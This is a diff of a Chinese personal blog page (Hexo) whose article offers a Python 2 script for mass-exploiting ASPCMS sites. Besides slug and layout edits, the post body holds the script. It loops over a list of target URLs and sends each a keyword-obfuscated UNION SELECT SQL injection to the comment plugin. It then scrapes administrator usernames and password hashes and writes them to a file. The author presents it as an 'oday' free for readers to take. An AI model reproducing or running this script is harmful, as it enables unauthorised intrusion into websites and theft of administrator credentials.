@@ -5,16 +5,19 @@
   
   <title>ASPCMS批量测试脚本 | 孤独常伴</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="ASPCMS批量测试脚本  下面是关于批量刷ASPCMS漏洞的脚本,这里用到的是aspcms的一个oday">
+  <meta name="description" content="下面是关于批量刷ASPCMS漏洞的脚本,这里用到的是aspcms的一个oday
+123456789101112131415161718192021222324252627282930#!/use/bin/python# -*- coding: utf-8 -*-  import urllib2version = &amp;apos;&amp;apos;&amp;apos;+------------------------">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ASPCMS批量测试脚本">
-<meta property="og:url" content="ka1i.org/2017/10/21/ASP批量测试代码/index.html">
+<meta property="og:url" content="ka1i.org/2017/10/21/aspcms/index.html">
 <meta property="og:site_name" content="孤独常伴">
-<meta property="og:description" content="ASPCMS批量测试脚本  下面是关于批量刷ASPCMS漏洞的脚本,这里用到的是aspcms的一个oday">
-<meta property="og:updated_time" content="2017-10-22T05:51:47.434Z">
+<meta property="og:description" content="下面是关于批量刷ASPCMS漏洞的脚本,这里用到的是aspcms的一个oday
+123456789101112131415161718192021222324252627282930#!/use/bin/python# -*- coding: utf-8 -*-  import urllib2version = &amp;apos;&amp;apos;&amp;apos;+------------------------">
+<meta property="og:updated_time" content="2018-01-23T03:52:31.476Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ASPCMS批量测试脚本">
-<meta name="twitter:description" content="ASPCMS批量测试脚本  下面是关于批量刷ASPCMS漏洞的脚本,这里用到的是aspcms的一个oday">
+<meta name="twitter:description" content="下面是关于批量刷ASPCMS漏洞的脚本,这里用到的是aspcms的一个oday
+123456789101112131415161718192021222324252627282930#!/use/bin/python# -*- coding: utf-8 -*-  import urllib2version = &amp;apos;&amp;apos;&amp;apos;+------------------------">
   
     <link rel="alternative" href="/atom.xml" title="孤独常伴" type="application/atom+xml">
   
@@ -266,10 +269,10 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-ASP批量测试代码" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-aspcms" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/10/21/ASP批量测试代码/" class="article-date">
+      <a href="/2017/10/21/aspcms/" class="article-date">
       <time datetime="2017-10-21T02:20:37.000Z" itemprop="datePublished">2017-10-21</time>
 </a>
     </div>
@@ -308,9 +311,12 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p><strong> ASPCMS批量测试脚本 </strong> <excerpt in="" index="" |="" 首页摘要=""><br>下面是关于批量刷ASPCMS漏洞的脚本,这里用到的是aspcms的一个oday<br><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""></the></excerpt></p>
+        <p>下面是关于批量刷ASPCMS漏洞的脚本,这里用到的是aspcms的一个oday</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">#!/use/bin/python</div><div class="line"># -*- coding: utf-8 -*-  </div><div class="line">import urllib2</div><div class="line">version = &apos;&apos;&apos;</div><div class="line">+----------------------------------------------------+</div><div class="line">+       loners               Blog:ka1i.org           +</div><div class="line">+----------------------------------------------------+</div><div class="line">&apos;&apos;&apos;</div><div class="line">print version</div><div class="line">url = list(open(&apos;aspcms.txt&apos;))</div><div class="line">for c in url:</div><div class="line">  try:</div><div class="line">    response = urllib2.urlopen(c.strip(&apos;\n&apos;)+&quot;/plug/comment/commentList.asp?id=0%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now%28%29,null,1%20%20frmasterom%20&#123;prefix&#125;user&quot;,timeout=3)</div><div class="line">    htmls = response.read()</div><div class="line">    username = htmls[htmls.find(&apos;&lt;/span&gt;&apos;):]</div><div class="line">    password = htmls[htmls.find(&apos;&lt;div class=&quot;line2&quot;&gt;&apos;):]</div><div class="line">    print &quot;URL :&quot;+c</div><div class="line">    print &quot;USERNAME:&quot;+username[16:22]</div><div class="line">    print &quot;PASSWORD:&quot;+password[19:35]</div><div class="line">    print &quot;---------------------------------&quot;</div><div class="line">    fileput = open(&apos;adminss.txt&apos;, &apos;a&apos;)</div><div class="line">    fileput.write(&quot;URL :&quot;+c)</div><div class="line">    fileput.write(&quot;USERNAME :&quot;+username[16:22]+&quot;\n&quot;)</div><div class="line">    fileput.write(&quot;PASSWORD :&quot;+password[19:35]+&quot;\n&quot;)</div><div class="line">    fileput.write(&quot;-----------------------------------&quot;+&quot;\n&quot;)</div><div class="line">    fileput.close()</div><div class="line">  except Exception,url:</div><div class="line">    print &quot;URL :&quot;+c</div><div class="line">    print str(url)</div><div class="line">    print &quot;---------------------------------&quot;</div></pre></td></tr></table></figure>
-<p>有用的拔去吧！<br>希望大家长期关注本人博客就行了！！！&gt; 如果文章对你有帮助,请去多多关注我博客吧! <a href="http://ka1i.org">我的博客</a></p>
+<p>有用的拔去吧！<br>希望大家长期关注本人博客就行了！！！</p>
+<blockquote>
+<p>如果文章对你有帮助,请去多多关注我博客吧! <a href="http://ka1i.org">我的博客</a></p>
+</blockquote>
 
       
       
@@ -366,13 +372,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/10/21/ASP批量测试代码/">ASPCMS批量测试脚本</a></p>
+        <p><span>本文标题:</span><a href="/2017/10/21/aspcms/">ASPCMS批量测试脚本</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 孤独常伴 的个人博客">孤独常伴</a></p>
         <p><span>发布时间:</span>2017年10月21日 - 10时20分</p>
-        <p><span>最后更新:</span>2017年10月22日 - 13时51分</p>
+        <p><span>最后更新:</span>2018年01月23日 - 11时52分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/10/21/ASP批量测试代码/" title="ASPCMS批量测试脚本">ka1i.org/2017/10/21/ASP批量测试代码/</a>
-            <span class="copy-path" data-clipboard-text="原文: ka1i.org/2017/10/21/ASP批量测试代码/　　作者: 孤独常伴" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/10/21/aspcms/" title="ASPCMS批量测试脚本">ka1i.org/2017/10/21/aspcms/</a>
+            <span class="copy-path" data-clipboard-text="原文: ka1i.org/2017/10/21/aspcms/　　作者: 孤独常伴" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -478,7 +484,7 @@
             <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
     </div>
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/01/23/wrj/">迫降无人机</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/23/GIthub搭建博客/">Github搭建Hexo博客</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/22/ajax-jsonp/">ajax和jsonp区别</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/22/server-config/">ubuntu服务器详细配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/21/ASP批量测试代码/">ASPCMS批量测试脚本</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/01/23/wrj/">迫降无人机</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/23/hexo/">Github搭建Hexo博客</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/22/ajax-jsonp/">ajax和jsonp区别</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/22/server-config/">ubuntu服务器详细配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/21/aspcms/">ASPCMS批量测试脚本</a></li></ul>
     <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
     <script>
         $(".post-list").addClass("toc-article");
